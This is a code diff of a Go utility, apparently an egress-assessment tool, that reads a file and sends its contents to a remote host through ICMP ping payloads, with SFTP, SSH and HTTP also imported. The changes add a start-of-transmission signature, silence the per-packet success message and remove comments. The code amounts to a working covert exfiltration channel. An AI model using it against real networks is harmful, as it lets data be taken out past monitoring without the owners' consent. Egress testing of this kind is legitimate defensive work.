@@ -23,14 +23,12 @@ import (
 	"bufio"
 	"bytes"
 	"crypto/tls"
-	"flag"
-	"fmt"
-	"path/filepath"
-	"strings"
-	//"encoding/json"
 	"ego-assess/data"
+	"encoding/base64"
 	"encoding/binary"
 	"errors"
+	"flag"
+	"fmt"
 	"github.com/pkg/sftp"
 	"golang.org/x/crypto/ssh"
 	"io/ioutil"
@@ -38,6 +36,8 @@ import (
 	"net"
 	"net/http"
 	"os"
+	"path/filepath"
+	"strings"
 	"time"
 )
 
@@ -67,15 +67,14 @@ type icmp struct {
 	data       [1016]byte
 }
 
-// Ping public method
 func Ping(ip string, data []byte) (bool, error) {
-	recv := make([]byte, 1024)                //保存响应数据
-	raddr, err := net.ResolveIPAddr("ip", ip) //raddr为目标主机的地址
+	recv := make([]byte, 1024)
+	raddr, err := net.ResolveIPAddr("ip", ip)
 	if err != nil {
 		fmt.Sprintf("resolve ip: %s fail:", ip)
 		return false, err
 	}
-	laddr := net.IPAddr{IP: net.ParseIP("0.0.0.0")} //源地址
+	laddr := net.IPAddr{IP: net.ParseIP("0.0.0.0")}
 	if ip == "" {
 		return false, errors.New("ip or domain is null")
 	}
@@ -102,12 +101,6 @@ func Ping(ip string, data []byte) (bool, error) {
 	return true, nil
 }
 
-/*
-求校验和步骤：
-（1）把校验和字段置为0；
-（2）把需校验的数据看成以16位为单位的数字组成，依次进行二进制反码求和；
-（3）把得到的结果存入校验和字段中。
-*/
 func checkSum(data []byte) uint16 {
 	var (
 		sum    uint32
@@ -146,7 +139,7 @@ func assemblyIcmp(data []byte) bytes.Buffer {
 	buffer.Reset() //清空buffer
 
 	//生成最终发送数据
-	binary.Write(&buffer, binary.BigEndian, icmpPack) //写入ICMP头
+	binary.Write(&buffer, binary.BigEndian, icmpPack)
 	return buffer
 }
 
@@ -312,6 +305,15 @@ func (client Client) transmitICMP() {
 	totalPackets := 0
 	bytesRead := 0
 	var icmpSample icmp
+
+	//icmp starttransmit signature
+	var transmitHeader = ".:::-989-:::."
+
+	hbytes := bytes.NewBuffer([]byte(transmitHeader))
+
+	//hbytes.ReadFrom(client.Data)
+
+	client.Data = hbytes
 	full := client.Data.Len()
 	//.calcalate total packets
 	if (client.Data.Len() % len(icmpSample.data)) == 0 {
@@ -328,10 +330,7 @@ func (client Client) transmitICMP() {
 		_, err := Ping(client.Target, client.Data.Next(len(icmpSample.data)))
 		if err != nil {
 			fmt.Printf("Error: %s", err)
-		} else {
-			fmt.Printf("%s Ping ok!\n", client.Target)
 		}
-
 		bytesRead += len(icmpSample.data)
 
 	}
@@ -392,6 +391,7 @@ func main() {
 	fileBuffer := new(bytes.Buffer)
 	fileBuffer.ReadFrom(file)
 	contents := bytes.NewBuffer(fileBuffer.Bytes())
+	//add base64 serialization here?
 	client = Client{remoteHost, remotePort, exfilProtocol, username, password, contents}
 	client.transmit()
 
